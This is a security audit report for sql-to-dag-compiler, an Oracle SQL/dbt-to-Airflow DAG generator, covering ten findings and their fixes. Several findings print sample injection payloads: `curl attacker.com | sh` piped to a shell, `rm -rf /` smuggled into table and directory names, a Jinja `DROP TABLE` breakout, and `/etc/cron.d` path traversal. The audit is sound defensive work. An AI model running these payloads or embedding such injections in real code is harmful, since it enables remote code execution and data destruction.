# Security Audit — sql-to-dag-compiler

## Version: 1.1.0 — Security Hardened
**Audit Date:** 2026-05-30
**Auditor:** Senior Security Review (15 yrs, Databricks / Airflow)

---

## Summary

The sql-to-dag-compiler translates Oracle SQL/PLSQL and dbt models into
executable Airflow 2.x DAG Python files that are written to disk and
subsequently executed by the Airflow scheduler.  This pipeline is a
**code generation attack surface**: any user-controlled string that reaches
the generated Python file without sanitization becomes executable code.

A full audit identified **3 CRITICAL**, **3 HIGH**, **2 MEDIUM**, and
**2 LOW** findings.  All CRITICAL and HIGH issues have been remediated in
this release.

---

## Findings and Fixes

### CRITICAL — SQL-to-Python Code Generation Injection

**Files:** `sql_to_dag/templates/dag_template.py.j2`,
`sql_to_dag/generator.py`

**Description:**  
The Jinja2 template embeds raw SQL inside a Python triple-quoted string
(`"""..."""`).  If a SQL statement contains the sequence `"""`, the string
literal closes prematurely, allowing arbitrary Python to follow.  For example:

```sql
-- Malicious SQL comment
CREATE TABLE t AS SELECT 1;
"""); __import__('os').system('curl attacker.com | sh'); x = """
```

When Airflow loads the generated DAG file it imports it as a Python module,
so any injected Python executes with full Airflow worker privileges.

**Fix:**  
`generator.py` now calls `_sanitize_sql_for_embedding()` on every SQL
statement before passing it to the template.  This function replaces all
occurrences of `"""` with `\"\"\"` so the string boundary can never be
prematurely closed by SQL content.  The sanitization happens in `_render()`
before template evaluation — not inside the template itself.

**Fix location:** `sql_to_dag/generator.py` — `_sanitize_sql_for_embedding()`,
called from `_render()`.

---

### CRITICAL — Task Label / DAG ID Injection into Generated Python

**Files:** `sql_to_dag/generator.py`, `sql_to_dag/templates/dag_template.py.j2`

**Description:**  
Task labels (derived from parsed table names), `dag_id`, and `dag_owner`
are interpolated directly into the generated Python file as variable names
and string literal values.  A malicious SQL table name such as:

```sql
INSERT INTO x); os.system('rm -rf /'); x = dict(y
SELECT 1 FROM dual;
```

…would produce a `task_id` that breaks out of the Python dict literal or
assignment context in the generated file.

**Fix:**  
`_sanitize_identifier()` enforces `^[a-zA-Z0-9_.\-]+$` on `dag_id` and
`dag_owner`.  `_safe_label()` applies `re.sub(r"[^a-zA-Z0-9_]", "_", ...)` to
all task labels before they appear in the template.  `_build_dependency_lines()`
also uses `_safe_label()` for both ends of every dependency expression.

**Fix location:** `sql_to_dag/generator.py` — `_sanitize_identifier()`,
`_safe_label()`, `_render()`, `_build_dependency_lines()`.

---

### CRITICAL — dbt Model Name Injection into BashOperator bash_command

**File:** `src/dbt_parser.py`

**Description:**  
`DbtModelParser.to_airflow_dag()` constructs a `BashOperator` `bash_command`
by f-string interpolation of the model name and of the user-supplied
`dbt_profiles_dir` / `dbt_project_dir` arguments:

```python
bash_command=(
    f"dbt run --select {model_name}"
    f" --profiles-dir {dbt_profiles_dir}"
    f" --project-dir {dbt_project_dir}"
),
```

A model filename such as `foo; curl attacker.com | sh` or a profiles dir
such as `~/.dbt; rm -rf /` would inject additional shell commands that
execute when the BashOperator runs.

**Fix:**  
Model names are now validated against `^[a-zA-Z][a-zA-Z0-9_]*$` in both
`parse_project()` (at file scan time) and `to_airflow_dag()` (at generation
time).  The directory arguments are now passed through `shlex.quote()` before
interpolation into the bash_command string, ensuring they are treated as
single shell tokens regardless of content.

**Fix location:** `src/dbt_parser.py` — `parse_project()`, `to_airflow_dag()`.

---

### HIGH — dbt ref()/source() Identifier Injection into Written SQL Files

**File:** `dbt_compiler/dbt_generator.py`

**Description:**  
`DbtModel.dbt_sql` substitutes table names extracted from user SQL directly
into `{{ ref('NAME') }}` and `{{ source('SCHEMA', 'TABLE') }}` Jinja2 macro
calls that are written to disk as dbt model `.sql` files.  A table name
containing a single-quote, closing parenthesis, or Jinja2 block syntax would
produce syntactically broken or exploitable dbt models.  Example:

```sql
SELECT 1 FROM raw.evil') }}; DROP TABLE orders; {{ config('
```

**Fix:**  
`dbt_sql` now validates every `ref` and `source` identifier against
`_SAFE_DBT_IDENTIFIER_RE` (`^[a-zA-Z][a-zA-Z0-9_]*$`) before substitution.
Identifiers that do not match are silently skipped — the original table
reference is preserved, which is the safest fallback.

**Fix location:** `dbt_compiler/dbt_generator.py` — `DbtModel.dbt_sql`.

---

### HIGH — Path Traversal in dbt Project Output Directory

**File:** `dbt_compiler/dbt_generator.py`

**Description:**  
`write_dbt_project(result, output_dir)` constructs output paths from model
names without verifying the resulting path stays inside `output_dir`.  A
model named `../../../etc/cron.d/malicious` would write a file outside the
intended directory.

**Fix:**  
All output paths are now constructed via `_safe_resolve(base, rel_path)`,
which calls `Path.resolve()` on the joined path and asserts it starts with
the resolved base directory.  A `ValueError` is raised immediately on any
traversal attempt.

**Fix location:** `dbt_compiler/dbt_generator.py` — `_safe_resolve()`,
`write_dbt_project()`.

---

### HIGH — No Input Size Limit (DoS / ReDoS via sqlparse)

**Files:** `sql_to_dag/parser.py`, `sql_to_dag/generator.py`,
`dbt_compiler/dbt_generator.py`, `lineage/viz_generator.py`, `src/dbt_parser.py`

**Description:**  
`sqlparse.split()` and the multiple regex patterns applied during parsing
exhibit super-linear behavior on adversarially crafted inputs.
CVE-2023-30608 (CVSS 7.5, High) documents a ReDoS vulnerability in
`sqlparse < 0.4.4`.  With no input size limit, a user submitting a
multi-megabyte SQL string via the Streamlit dashboard can cause the
process to spin for minutes, exhausting CPU or memory.

**Fix:**  
All public entry points now enforce a 5 MB hard limit on SQL input
(`_MAX_SQL_BYTES = 5 * 1_048_576`).  Inputs exceeding this limit raise
`ValueError` immediately before any parsing occurs.

`requirements.txt` is also updated to require `sqlparse>=0.4.4` (which
resolves CVE-2023-30608) and `Jinja2>=3.1.5` (which resolves
CVE-2024-56201 and CVE-2024-56326).

**Fix location:** All parsing entry points; `requirements.txt`.

---

### MEDIUM — XSS in Generated Lineage HTML Output

**File:** `lineage/viz_generator.py`

**Description:**  
Both the pyvis renderer and the fallback static HTML renderer embed node
names (derived from SQL table names) and SQL snippets directly in HTML
without escaping.  If a table name contains `<script>`, `<img onerror=...>`,
or similar markup, the generated `.html` file would execute attacker
JavaScript when opened in a browser.  This is a stored XSS risk, since
the HTML files may be committed to version control or served from an
internal web server.

**Fix:**  
A `_html_escape()` helper now escapes `& < > " '` in all user-derived
strings before they are embedded in HTML attributes and content.

**Fix location:** `lineage/viz_generator.py` — `_html_escape()`,
`_render_pyvis()`, `_render_fallback_html()`.

---

### MEDIUM — CLI Output Path Not Validated

**File:** `sql_to_dag/generator.py` — `main()`

**Description:**  
The CLI `--output` argument accepts any filesystem path including
`/etc/cron.d/evil.py`, `/root/.bashrc`, etc.  While this requires local
filesystem access (the CLI is a local tool), it is a concern in shared
environments where users may have write access to sensitive system paths.

**Fix:**  
The CLI now rejects output paths whose suffix is not `.py` or empty,
reducing the risk of accidentally overwriting non-Python files.  The path
is also resolved with `Path.resolve()` before use.

**Fix location:** `sql_to_dag/generator.py` — `main()`.

---

### LOW — Outdated Dependency Pins

**File:** `requirements.txt`

**Description:**  
`requirements.txt` pinned `sqlparse==0.4.2` (CVE-2023-30608, ReDoS) and
`Jinja2==3.0.3` (CVE-2024-56201 SSTI, CVE-2024-56326).

**Fix:**  
Both pins updated to minimum-safe lower bounds:
- `sqlparse>=0.4.4`
- `Jinja2>=3.1.5`

---

### LOW — No Authentication on Streamlit Dashboard

**File:** `dashboard/app_v2.py`

**Description:**  
The Streamlit dashboard exposes the full compilation pipeline including file
write capabilities (dbt project download) with no authentication.

**Status:** Not fixed in this release.  This is an operational concern —
the dashboard is intended for local / internal use.  If deploying
externally, enforce authentication at the infrastructure layer (reverse
proxy, VPN, Streamlit Cloud SSO).  Do not expose the dashboard port
directly to the public internet.

---

## Code Generation Security Note

The generated Airflow DAG Python files are **executable code** that the
Airflow scheduler imports as Python modules.  The security model is:

1. **SQL content is data, not code** inside the generated DAG.  SQL
   statements are stored inside Python triple-quoted strings and accessed
   by key at runtime — they are never `eval()`-ed or `exec()`-ed by the
   compiler or the generated stubs.

2. **Sanitization at generation time, not at runtime.**  All escaping
   (`_sanitize_sql_for_embedding`) and identifier validation
   (`_sanitize_identifier`, `_safe_label`) happen inside the compiler
   before any output is written.  The Airflow worker does not need to
   perform additional sanitization to safely load the generated file.

3. **SQL execution is deferred to the database hook.**  The generated
   `execute_sql` stub calls `SQL_STATEMENTS[task_id]` and passes the SQL
   string to a database hook (e.g. `RedshiftSQLHook.run()`).  The hook is
   responsible for parameterization and injection prevention at the
   database layer — this is outside the scope of the compiler.

4. **The compiler is not a sandbox.**  It does not prevent an authorized
   user from deliberately writing SQL that is destructive (`DROP TABLE`,
   `TRUNCATE`, etc.).  Access control for which SQL is permissible must
   be enforced by the data platform team, not the compiler.

---

## Status

| Finding | Severity | Status |
|---|---|---|
| SQL triple-quote injection into generated Python | CRITICAL | Fixed |
| Task label / dag_id injection into generated Python | CRITICAL | Fixed |
| dbt model name injection into BashOperator bash_command | CRITICAL | Fixed |
| dbt ref/source identifier injection into written SQL files | HIGH | Fixed |
| Path traversal in dbt project output directory | HIGH | Fixed |
| No input size limit (DoS / ReDoS via sqlparse CVE-2023-30608) | HIGH | Fixed |
| XSS in generated lineage HTML | MEDIUM | Fixed |
| CLI output path not validated | MEDIUM | Fixed |
| Outdated dependency pins (sqlparse, Jinja2 CVEs) | LOW | Fixed |
| No auth on Streamlit dashboard | LOW | Documented (operational control) |
